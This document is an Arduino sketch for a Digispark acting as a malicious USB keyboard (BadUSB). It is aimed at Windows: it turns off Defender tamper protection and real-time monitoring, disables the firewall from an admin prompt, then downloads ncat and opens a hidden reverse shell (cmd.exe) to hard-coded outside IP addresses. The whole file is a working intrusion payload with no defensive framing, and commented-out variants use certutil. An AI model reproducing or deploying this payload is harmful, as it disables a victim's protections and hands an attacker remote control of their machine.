#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);  // Start clean

  // Open Windows Settings
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win + R
  DigiKeyboard.delay(600);
  DigiKeyboard.print("ms-settings:windowsdefender");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000); // Wait for Security settings to open

  // Tab navigation to "Virus & threat protection settings" > "Manage settings"
  for (int i = 0; i < 1; i++) {  // Navigate using Tab to "Manage settings"
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(300);
  }

  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Click "Manage settings"
  DigiKeyboard.delay(2200);

  // Tab to Tamper Protection toggle
  for (int i = 0; i < 4; i++) {
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(300);
  }

  DigiKeyboard.sendKeyStroke(KEY_ENTER); 

  for (int i = 0; i < 5; i++) {
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(500);
  }

  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Toggle OFF
  DigiKeyboard.delay(500);

  //DigiKeyboard.sendKeyStroke(KEY_ENTER); 

  //DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  //DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(KEY_LEFT);  // Move focus to "Yes"
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter on "Yes"

//kill switch for setting and security apps

  DigiKeyboard.delay(1000);  // Wait for window to appear
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // Kill it
  DigiKeyboard.delay(1000);  // Wait for window to appear
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // Kill it


//exploitation part

#include "DigiKeyboard.h"


  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);

  // Open CMD as Admin (Win+X → A → Y)
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  
  DigiKeyboard.delay(2100);

  // Disable Firewall
  DigiKeyboard.println("netsh advfirewall set allprofiles state off");
  DigiKeyboard.delay(200);
  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");

  // Download and execute nc.exe DIRECTLY without saving (PowerShell)
  //DigiKeyboard.println("certutil -urlcache -split -f https://github.com/err0r-arsenal/netcat/blob/main/ncat.exe ncat.exe && ncat.exe 34.131.81.121 4444 -e cmd.exe");

  //DigiKeyboard.println("Invoke-WebRequest -Uri https://github.com/err0r-arsenal/netcat/raw/refs/heads/main/ncat.exe -OutFile cat.exe; ./cat.exe 34.131.81.121 4444 -e cmd.exe; -WindowStyle Hidden");  //own command to execute ncat through ip and port on vps

  DigiKeyboard.println("powershell -w Hidden -Command Invoke-WebRequest -Uri https://github.com/err0r-arsenal/netcat/raw/refs/heads/main/ncat.exe -OutFile cat.exe; ./cat.exe 34.131.140.5 4444 -e cmd.exe ");
//powershell -w Hidden -Command Invoke-WebRequest -Uri https://github.com/err0r-arsenal/netcat/raw/refs/heads/main/ncat.exe -OutFile cat.exe; ./cat.exe 34.131.140.5 4444 -e cmd.exe 
//powershell Invoke-WebRequest -Uri https://github.com/err0r-arsenal/netcat/raw/refs/heads/main/ncat.exe -OutFile cat.exe; ./cat.exe 34.131.81.121 4444 -e cmd.exe 

  DigiKeyboard.delay(1000);
  
 
}


void loop() {
  // Do nothing
}